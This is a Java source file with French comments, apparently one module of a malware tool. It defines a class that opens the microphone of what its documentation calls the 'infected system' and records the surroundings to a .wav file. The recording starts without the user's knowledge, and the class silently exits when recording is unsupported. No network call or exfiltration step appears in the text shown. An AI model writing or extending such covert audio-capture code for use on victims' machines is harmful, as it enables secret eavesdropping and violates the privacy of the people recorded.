package main;
import javax.sound.sampled.*;
import java.io.*;

/**
 * Enregistre le son de l'environnement du système infecté grâce au microphone.
 */
public class EnregistreurDeSon {

	// Endroit du fichier .wav
	File wavFile;

	/**
	 * Construteur d'EnregistreurDeSon.
	 * 
	 * @param location
	 *            Endroit d'enregistrement pour le son provenant du microphone.
	 */
	public EnregistreurDeSon(String location) {
		wavFile = new File(location);
	}

	// Définie le type de fichier de son (.wav)
	AudioFileFormat.Type fileType = AudioFileFormat.Type.WAVE;

	// Ligne que l'audio vais être capturé
	TargetDataLine line;

	/**
	 * Définie le format de son.
	 * 
	 * @return Retourne le format de son spécifé avec les cinq paramètres
	 *         (variables).
	 */
	AudioFormat getAudioFormat() {
		float sampleRate = 16000;
		int sampleSizeInBits = 8;
		int channels = 2;
		boolean signed = true;
		boolean bigEndian = true;
		AudioFormat format = new AudioFormat(sampleRate, sampleSizeInBits, channels, signed, bigEndian);
		return format;
	}

	/**
	 * Capture le son et l'enregistre dans un fichier .wav
	 */
	void start() {
		try {
			AudioFormat format = getAudioFormat();
			DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);

			// Vérifie si le système supporte l'enregistrement
			if (!AudioSystem.isLineSupported(info)) {
				System.exit(0);
			}

			line = (TargetDataLine) AudioSystem.getLine(info);
			line.open(format);
			line.start();

			// Début de capture
			AudioInputStream ais = new AudioInputStream(line);

			// Début de l'enregistrement
			AudioSystem.write(ais, fileType, wavFile);

		} catch (LineUnavailableException | IOException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Ferme la ligne d'écoute pour terminer la capture et l'enregistrement.
	 */
	void finish() {
		line.stop();
		line.close();
	}
}